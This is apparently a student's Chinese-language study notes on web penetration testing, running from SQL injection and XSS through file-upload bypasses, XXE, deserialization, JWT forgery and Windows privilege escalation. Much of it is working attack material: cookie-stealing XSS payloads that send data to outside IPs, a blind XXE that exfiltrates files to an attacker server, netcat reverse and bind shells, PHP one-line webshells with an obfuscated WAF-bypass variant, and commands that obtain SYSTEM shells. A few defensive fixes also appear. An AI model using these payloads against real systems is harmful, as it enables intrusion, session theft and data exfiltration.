域名与IP地址
	一个IP地址可以有多个域名，一个域名只能指向一个IP地址。
	如：
	有一个目录存放了3个不同的项目
		list（192.168.0.6:8080）
			博客网站
				1.html
			论坛网站
				22.html
			教务网站
				333.html
		上述3个网站都在一个同一台（电脑/服务器）部署，我们可以为这3个项目分别设置域名www.bolg.com、www.luntan.com、www.jiaowu.cn。
		若使用扫描网站目录工具扫描域名www.bolg.com，只可以扫描到博客网站这个目录下的内容；
		如果扫描IP地址193.168.0.6，就可以扫描到list目录下的内容，即可以获取到其他项目的源码内容
		总之，扫描IP可以比扫描域名的目录范围大一级。
	
	
常见网络站点类型：
	1.目录型站点
	2.端口型站点
	3.子域名型站点
	4.类似域名站点( xxx.com; xxx.cn; xxx.top; xxx.org )或前缀或后缀不同
	5.旁注，C段站点； 旁注：同服务器不同站点	C段：不同服务器不同站点但是同网段
	6.软件搭建习惯特征站点(中间件漏洞等)

2023.10.7
	Layer 查子域名软件4.2
	补天  src漏洞挖掘  挖到了有钱
	ipip  可以选择地区ping，尝试绕过cdn,建议在南非这种贫困地区ping更容易获取最终IP地址，因为很少有公司会在这些地方专门建一个cdn结点
	crt.sh 也可查子域名 证书

2023.10.8
	SQL注入
	flask的ORM模型可以避免sql注入，因为它在代码中不用写SQL语句；
	弱类型语言会自动推导传入数据的类型，如传入8是int，传入8'是string；而对于强类型语言，如果试图把一个字符串传入int型变量，则会抛出异常程序无法继续执行；所以强类型语言很少存在数字型注入漏洞；



2023.10.9 MySql注入
	判断注入：
		老办法：and 1=1 --+页面正常	and 1=2--+ 错误
	now：
		1.猜字段数order by 1、order by 2、order by 3......猜到页面错误（此步骤判断注入）  order by是根据字段排序
		2.union select 1,2,3 (直到字段数) 用数字容易出现类型不兼容的异常，数字可换成null替代
		3.用union查询敏感信息(类似web安全书P73)
	信息收集：
		数据库版本：version()
		数据库名字：database()
		数据库用户：user()
		操作系统：@@version_compile_os
	数据注入：
		同数据库(MySql)-->	高版本（5.0以上）可用数据库表视图有据查询，如information_schema.tables;  (https://zhuanlan.zhihu.com/p/438772250)
							低版本 暴力查询或结合读取查询
	group_concat(a),可以把a字段的所有值合并起来，如a字段下有值'username'、'password'、'45'、'789'，则输出username，password，45，789
     
2023.10.11 MySql注入
	文件读取操作
		load_file('xxxxxxx')	读取函数	
		into outfile 或 into dumpfile 写入函数
		

	把注入语句中的'xxxxxxx'字符串换成16进制可以绕过某些简单的SQL注入过滤器和php魔法引号；（宽字节、二次注入绕过可魔法）
	MySql的关键字不区分大小写，可以利用这个绕过简单的关键词过滤，如select可以改成SelecT；大多数DBMS（数据库管理系统）对于SQL语句的关键字和标识符是不区分大小写的

2023.10.17 
	搜索注入
		select * from user where name like '%xiaodi%'；用到SQL的模糊查询，%是通配符

2023.11.08
	宽字节注入 %DF' ->到php代码转义 -> %DF\' ->url就变成 %DF%5C%27 倘若网站是GBK数据库也用GBK，%DF%5C就是生僻字衰  ->到数据库就变成  衰' 此时引号成功注入sql语句中
	SQL盲注
		报错回显 https://bbs.huaweicloud.com/blogs/392084
		延时盲注
		布尔盲注	指页面只返回正确和错误两种结果，不回显任何信息；这时候可以注入and xxxx命令猜数据库的敏感信息，猜对页面则正常显示返回正确，猜错了则返回错误页面；如先猜数据库名字的长度？猜数据库名字第一位是？第二位是？
		
2023.11.18
	二次注入：
	目标：更改xiaomi的密码为88888888
	注册页面注册 账号名为xiaomi'# 密码为1231321（随便填）
	接着进入账号xiaomi'# 更改密码为88888888 此时后台的sql语句就变成 update password='88888888' where username='xiaomi' #' and password='1231321'
	此时，橙色的语句就被注释掉了，即该语句把xiaomi的密码改了而xiaomi'#的密码不变
	

	堆叠注入：
	就是利用;号写多个sql语句，有局限性，有些数据库支持执行多个语句，有些不行
	
	执行注释内的语句：
	select version（）,/*!50554 now（）,*/user（）；若版本大于50554则会执行
	select version（）,/*!now（）,*/user（）；如果省略版本号，则都会执行

---------------------------
	xss获取cookie，http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>
	利用xss漏洞，受害者点击链接就会访问目标网站，并且会加载<script src="http://127.0.0.1/DVWA/vulnerabilities/xss_r/hacker.js" /></script>这段代码，此时hacker.js就可以获取受害者在目标网站的cookie，并将cookie发送到我的网站。

数据通信网络基础

	网络通信：终端设备之间通过计算机网络进行的通信
	应用层(Data)
		http 	80	TCP
		
		Telnet 	23	TCP	远程登录协议，提供远程管理服务
		
		FTP		20、21	TCP	文件传输协议，提供互联网文件资源共享服务
		
		SMTP	25	TCP	简单邮件传输协议
		
		TFTP	69	UDP	简单文件传输协议，简单的文件传输
		
	传输层(Segment 段) 段里面会有源端口和目的端口的信息
		TCP	面向连接、可靠的传输
		三次握手、四次挥手；Seq：发送方发送数据包中第一个字节的序列号，Ack：接受方期望接收的数据包第一个字节的序列号，一般=Seq+数据长度
		在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字节数（也就是缓冲区大小），如win=3
		
		UDP	无连接

文件上传
	.htaccess文件  
	文件内容：<FilesMatch "shana">
				SetHandler application/x-httpd-php
				</FilesMatch>
	如果文件夹下面有这样一个xxx.htaccess文件，那么该文件夹内的所有文件名为shana的文件都会被解析成php文件，如shana.png/shana.jpg/shana.txt
	如果文件包含漏洞不可用，就可以尝试上传类似这样的.htaccess文件。
	
	”1.php “、”1.php.“第一个，系统会强制把后面的空格去掉变成1.php，第二个，系统不允许这样命名，也会变成1.php。所以这两个可以尝试绕过代码的过滤。
	1.php::$DATA这样的命名方式。在Windows系统中，::$DATA是一种命名约定，用于指定文件流数据。这种命名方式会绕过一些简单的文件后缀名检测，因为上传文件的名称看起来仍然像是一个.php文件。但实际上，::$DATA部分被用于表示文件流数据。
	总的来说，这种技巧利用了Windows文件系统的特性和PHP的解析方式，绕过了一些基本的文件上传黑名单检测，使得攻击者可以上传并执行恶意PHP代码。
	
	抓包把文件名改成1.php/. 看似这成了文件夹的名字，实则还是会保存为1.php文件；这可绕过某些后缀名检测，1.php/.jpg 系统也会保存php文件而不是jpg，代码会以为后缀是.jpg，可绕过白名单检测

图片马制作
一句话木马：
<?php eval($_POST['cmd']); ?>//执行php代码
<?php exec($_POST['cmd']); ?>//执行命令


copy 1.png /b + shell.php /a webshell.jpg

copy: 这是一个用于复制文件的命令
/b: 这是 copy 命令的一个选项，表示以二进制模式进行复制。这个选项告诉 copy 命令不要将特殊字符解释为控制字符，而是直接复制它们。
/a: 这是 copy 命令的另一个选项，表示以文本模式进行复制。对于文本文件，这个选项告诉 copy 命令将文本文件作为 ASCII 文件处理。

Get-Content -Encoding Byte **6.png, gg.png** -ReadCount 0 | Set-Content -Encoding Byte **6gg.png**



iis6.0
文件夹
image/qq.jpg
image.asp/qq.jpg     qq.jpg就会被当做asp解析
文件
image.jpg
image.asp;.jpg或XXx.asp;xxx.jpg此文件会被当做asp执行
asp可以换做php如果换了php那么就当php执行

文件解析漏洞

apache-低版本

例：phpstudy(低版本、apache)
1.php.xxx会被当作php执行
解释:解析文件时识别后缀.xxx失败，则会向前解析，识别成.php 

上传参数名解析：明确哪些东西能修改？
Content-Disposition:一般可更改
name:表单参数值，不能更改
filename:文件名，可以更改
Content-Type:文件MIME,视情况更改

#常见绕过WAF方法：
数据溢出-防匹配(xxx...)
符号变异-防匹配(' ” ;)
数据截断-防匹配(%00；换行)  
在 URL 编码中，%00 表示 NULL 字符（ASCII 码为0）。NULL 字符通常用于表示字符串的结束，在某些情况下也可以用作字符串的分隔符。
重复数据-防匹配（参数多次）
本地fuzz大法测试 网上找fuzz字典

#文件上传安全修复方案
后端验证：采用服务端验证模式
后毁检测：基于黑名单，白名单过滤
MTME检测：基于上传自带类型检测
内容检测：文件头，完整性检测
自带函数过滤：参考upload1abs函数
自定义函数过滤：function check file（）{}
WA防护产品：宝塔，云盾，安全公司产品等

XSS跨站脚本Cross-Site Scripting
<script>document.write('<img src="http://192.168.5.52:8888?x='+document.cookie +'" width=0 height=0 >')</script >
<script>alert(document.cookie)</script>
<script>fetch('http://192.168.5.52:8888?x=' + document.cookie);</script>

CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。
XSS只能获取到有漏洞网站的受害者cookie，仅限于此网站
CSRF则可以诱导受害者在多个网站操作

<script>document.location = 'http://92.168.99.131/Pikachu-master/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>

<script src='http://39.96.44.170/hack.js'></script>

XSS工具：beef、github_XSS-payload、XSStrike

HttpOnly
如果您在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookiet信息，这样能有效的防止SS攻击

进入后台两种方式：
1.获取coookie进入后台
2.直接账号密码登录

&#x4e2d;&#x56fd;中国
&#是html的转义序列，不是编码，payload用这个转义也是一种绕过方法

#XSS常规WAF绕过思路
标签语法替换
特殊符号干扰
提交方式更改
垃圾数据溢出
加密解密算法
结合其他漏洞绕过

CSRF（跨站请求伪造）

SSRF（服务器端请求伪造）
伪协议、各个协议调用探针：http,file,dict,ftp,gophers等

学习链接https://blog.csdn.net/unexpectedthing/article/details/121276653

漏洞攻击：端口扫描，指纹识别，漏洞利用，内网探针等
http://192.168.64.144/phpmyadmin/
file:///D:/www.txt
dict://192.168.64.144:3306/info
ftp://192.168.64.144:21

RCE指两个漏洞，代码及命令执行漏洞

**<?php**
**eval($REQUEST[x])**
**?>**
**x是代码执行**
**<?php**
**eval(echo `$REQUEST[x]`)**
**?>**
**x是命令执行，仅限于Linux系统，Windows不支持反引号``**

WTS-waf
+号替代空格可以绕过waf

文件包含
php包含函数会把被包含文件当作php脚本执行，所以会识别被包含文件中的php代码





#PHP反序列化
原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，
从而导致代码执行，SQL注入，目录遍历等不可控后果。在反序列化的过程中自动触发
了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。
**serialize ()**//将一个对象转换成一个字符串	这是序列化过程
**unserialize ()**//将字符串还原成一个对象		反序列化

有类反序列化

class ABC{
function_construct（）{
echo '调用了构造函数<br>'
}
function_destruct（）{
echo '调用了析构函数<br>';
}
function_wakeup（）{
echo '调用了苏醒函数<br>';
}
}

new ABC时调用构造函数		一个ABC对象被序列化之后会自动调用_sleep()函数		一个字符串被反序列化成ABC对象后，会调用苏醒函数	很好记，序列化后睡觉，反序列化后醒来  

程序结束对象ABC被销毁时自动调用析构函数



这些在java中继承下object的方法，在php中称魔法方法，类似的魔法方法还有_tostring()、__get()、_set()等等。



java反序列化

Java中的API实现：
位置：Java.io.ObjectOutputStream
java.io.ObjectlnputStream
序列化：
ObjectOutputStream-->writeobject ( )
注：该方法对参数指定的b对象进行序列化，把字节序列写到一个目标输出流中
按Java的标准约定是给文件一个.ser扩展名
反序列化：
ObjectInputStream>readobject( )
注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。

java反序列化payload生成工具：ysoserial 

下方的特征可以作为序列化的标志参考：
一段数据以**rO0AB**开头，你基本可以确定这串就是JAVA序列化base64加密的数据
或者如果以**aced**开头，那么他就是这一段java序列化的16进制。



如果一台服务器有反序列化远程命令执行漏洞，在服务器执行命令后看不到回显？

构造反弹shell

###### NC 反弹 shell

攻击场景：

```
　　Victim IP：  192.168.2.10
　　Attacker IP：192.168.2.11
```

###### 正向 Shell

我们想要弹回Victim的Shell，使用如下命令：

Victim：nc -lvp 9999 -e cmd.exe

Attacker：nc 192.168.2.10 9999

ps：先在肉鸡上开一个cmd服务，然后在攻击机上进行连接

###### 反向 Shell

Attacker：nc -vlp 9999

Victim：nc 192.168.2.11 9999 -e cmd.exe

ps：先在攻击机上进行监听，然后在肉鸡上给Attacker开一个cmd

Link: https://qftm.github.io/2019/08/03/Windows-Reverse-Shell/
本文章著作权归作者所有，任何形式的转载都请注明出处。



XXE-xml外部实体注入漏洞

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。XXE漏洞全称XMLExternal Entity Injection,即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。

html旨在显示信息，而xml旨在传输信息

<?xml version = "1.0"?>

<!DOCTYPE ANY[
<!ENTITY xxe SYSTEM "file:///c://1.txt">
]>
<x>&xxe; i am hacker！</x>


回显：flag1231213132 i am hacker！



XXE注入分有回显和无回显，若无回显，思路是在xml中定义一个变量a接收服务器本地文件，然后访问外部攻击者的服务器把变量a的数据提交上来

无回显一读取文件
<?xml version="1.0"?>

<!DOCTYPE test
#定义file变量=d:/test.txt里的内容(base64加密后)
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/test.txt">
#加载外部攻击者服务器写的xml
<!ENTITY % dtd SYSTEM "http://192.168.0.103:8081/test.dtd">
#运行dtd
%dtd;
#send变量藏在加载的外部xml中
%send
]>
#外部xml
test.dtd:
<!ENTITY % payload
#&#x25;表示%
"<!ENTITY &#x25; send SYSTEM
'http://192.168.0.103:8081/?data=%file;'>"
#这个变量的作用在于定义send变量，把file变量的内容发回来

%payload;

怎么找传输xml的接口？

1.数据格式类型判断	例：<user>test</user><pass>Mikasa</pass>
2.Content-Type值判断：text/xml；application/xml
3.更改Content-type值，再提交攻击xml（盲猜服务器会接收xml数据，如本来type是application/json，就可以尝试改成application/xml，提交xml的payload)



#xxe漏洞修复与防御方案-php,java,python-过滤及禁用
#方案1-禁用外部实体
PHP:
libxml_disable_entity_loader(true);
JAVA:
DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance( );dbf.setExpandEntityReferences(false);
Python:
from lxml import etree
xmlData=etree.parse(xmlSource,etree.XMLParser(resolve entities=False)

#方案2-过滤用户提交的xml数据
过滤关键词：<！DOCTYPE和<！ENTITY,或者SYSTEM和PUBLIC



JAVA安全-JWT安全及预编译CASE注入等

1.预编译CASE注入

绕过java预编译sql语句，条件是服务器的sql语句中必须用了order by，

如select name, id, age from user order by ?;		也就是根据什么字段排序，涉及到排序功能

通过使用case when语句可以将order byl后的orderExpressioni表达式中添加select语句。

payload：case when(sql注入语句)

2.JWT安全

JSON Web Token(JSON Web令牌)是一种跨域验证身份的方案。JWT不加密传输的数据，但能够通过数字签名来验证数据未被算改。

jwt内容格式是：头部.声明.数字签名 

签名(Signature)
服务器有一个不会发送给客户端的密码(secret)），用头部中指定的算野法对头部和声
明的内容用此密码进行加密，生成的字符串就是JWT的签名。
下面是一个用HS256生成JWT的代码例子
HMACSHA256 (base64UrlEncode (header)+"."+
base64UrlEncode (payload),secret)

**jwt修改伪造攻击**

问题来了，因为J的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密码呀？不要慌，我们直接去掉签名就好~修改头部为None
在HTTP传输过程中，Base64编码中的"=”，"+”，"/"等待殊符号通过UL解码通常容
易产生歧义，因此产生了与URL兼容的Base64 URL编码

[jwt解密/加密 - bejson在线工具](https://www.bejson.com/jwt/)

如Payload:

ewogICJhbGcioiAibm9uZSIKfQ.ewogICJpYXQioiAxNTgOMTY2NTIOLAogIc
JhZG1pbiI6ICJOenvlIiwKICAidXNleiI6ICJUb20iCn0.	

把base64 URL解密后的头部alg值改成none, 数字签名直接不写;这种方法成功与否取决与对方服务器有没有做签名验证

**jwt密钥爆破**
通过具有SHA-2功能的HMAC,您可以使用密钥来签名和验证令牌。一旦找出了这个密钥，我们就可以创建一个新令牌并对其进行签名。因此，密钥足够强大非常重要，这样暴力破解或字典攻击就不可行。拥有令牌后，就可以发起离线暴力破解或字典攻击。

拿jwt数据，得到加密的算法，然后密钥用字典去跑加密算法，直到解密后的数据==原jwt数据为止，跑之前记得先base64 URL解密

注意！jwt的声明部分一般都有iat和exp两个变量，值是时间戳，分别代表令牌生效时间和失效时间。如果拿到密钥，修改内容时不要忘了这一点。



1、用户端登录，用户名和密码在请求中被发往服务器
2、（确认登录信息正确后）服务器生成JSON头部和声明，将登录信息写入JSON的声明中(通常不应写入密码，因为JWT是不加密的)，并用secret用指定算法进行加密，生成该用户的JWT。此时，服务器并没有保存登录状态信息。
3、服务器将JWT（通过响应）返回给客户端
4、用户下次会话时，客户端会自动将JWT写在HTTP请求头部的Authorization字段中
5、服务器对JWT进行验证，若验证成功，则确认此用户的登录状态
6、服务器返回响应

jwt类型漏洞的检测：

1.javaweb

2.Authorization字段

3.JWT数据包格式



目录解析权限：某目录下脚本是否能在该目录执行的权限

一旦设置目录解析权限，即使上传了后门木马也不能执行



漏洞发现

goby（网络测绘，忍者里有旧版本）

AWVS（kali）

Xray

metasploit

漏洞修复

打补丁，关闭入口，防护应用......



#已知CMS
如常见的dedecms.discuz,wordpress等源码结构，这种一般采用非框架类开发,但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用白盒代码审计自行挖掘，Seay源代码审计系统。

#开发框架
如常见的chinkphp,spring,flask等开发的源码程序，这种源码程序正常的安全测试思路：先获取对应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审计自行挖掘。

#未知CMS
如常见的企业或个人内部程序源码，也可以是某CMS二次开发的源码结构，针对此类的源码程序测试思路：能识别二次开发就按已知CMS思路进行，不能确定二次开发的话可以采用常规综合类扫描工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以进行代码审计自行挖掘。

apk提取url-->**漏了个大洞**



信息收集waf绕过

安全狗：改请求方式、模拟用户（延时）、爬虫白名单，保证网站被浏览器收录，如360spider、baiduspider，修改此类ua头、找网上的免费代理，写脚本发包;

阿里云：阿里云的服务器只能采用模拟用户然后用代理池或延时扫描，爬虫引擎对阿里云无效，速度太快都会封

阿里云+宝塔+安全狗-->代理池或延时(至少3秒)



webshell绕过waf

1.变量覆盖

原式：<?php assert ($_POST['chopper']);?>

<?php

$a=$_GET['x'];

$$a=$_GET['y'];

$b($_POST['z'])-----加密处理--------->$b(base64_decode($_POST['z']))		//命令执行时要把z值base64加密，绕过waf的参数检测 

?>

http://xxxx/?x=b&y=assert&z=chopper	带入上述php代码就变成如下

<?php

$a=**b**

$$a=**assert**; 	-------->$$a----------->$($a)--------------->$b=assert;

$b(**'chopper'**)	------------->***assert('chopper')***

?>

2.混淆加密

php在线加密把webshell代码加密混淆



菜刀，蚁剑，冰蝎优缺点
菜刀：未更新状态，无插件，单向加密传输
蚁剑：更新状态，有插件，拓展性强，单向加密传输
冰蝎：更新状态，未知插件，双向加密传输



代码审计：

MVC架构 url：xxx.com/index.php?s=xx&c=xx&m=xx

一般s对应目录，c对应文件名，m对应方法

**渗透测试流程：**

1.目标确认	2.信息收集	3.漏洞发现	4.漏洞利用	5.权限维持	6.目标获取	7.写报告

![渗透测试流程](http://www.itheima.com/images/newslistPIC/1634020289174_%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.jpg)



权限提升工具

vulmap
操作系统漏洞扫描工具，Linux好用，window不太好用。
Windows需要用powershell运行，正常的web权限只能运行cmd，打不开powershell。

wesng(补丁筛查)
获取到服务器systeminfo信息，在自己电脑运行就可以

WindowsVulnScan
这个也要powershell在服务器运行脚本，运行完后产生一个json文件(本质就是systeminfo，格式不一样而已)，在执行命令导入这个json文件进行漏扫。
也可以获取到服务器systeminfo信息，改成它要的格式，在自己电脑运行就可以



at命令，Windows的计划任务
计划某某时间打开cmd，任务执行后该窗口是system权限，这是Windows的逻辑漏洞，仅限Win7之前的有用(xp、2003)

例：at 10:00AM /interactive cmd.exe

sc命令

`sc` 命令是 Windows 系统中的服务控制管理器命令行工具，用于管理和配置系统服务。

1. 使用 `sc` 命令创建一个新的服务。假设我们将新服务命名为 "CmdService"，然后将其配置为启动 `cmd.exe`。执行以下命令：

   ```
   sc create CmdService binpath= "cmd.exe /K start" start= auto
   ```

   这个命令将创建一个名为 "CmdService" 的服务，其可执行文件路径为 `cmd.exe /K start`，并将其配置为自动启动。

2. 启动该服务：

   ```
   sc start CmdService
   ```

   这个命令将启动名为 "CmdService" 的服务，也就是打开命令提示符（system权限）。

pstools

PsTools 是 Microsoft 提供的一组免费实用工具，它们用于执行各种系统管理任务。PsTools 包括多个命令行实用程序，其中最常用的是 PsExec 和 PsList。PsExec 允许在远程系统上执行命令，而 PsList 则显示系统进程信息。

```
psexec -s cmd
```

这个命令使用 `-s` 参数在远程系统上以系统权限（System）运行命令提示符（cmd）。

这将在当前计算机上打开一个命令提示符窗口，该窗口已使用系统权限启动。



数据库提权

MySql：

1.UDF提权知识点：(基于MYSQL调用命令执行函数)

数据库安装时用的是系统权限，数据库用户root执行sql的权限也是系统权限，所以只要猜解出root用户的密码，之后执行sql命令执行函数即可。



系统溢出漏洞提权
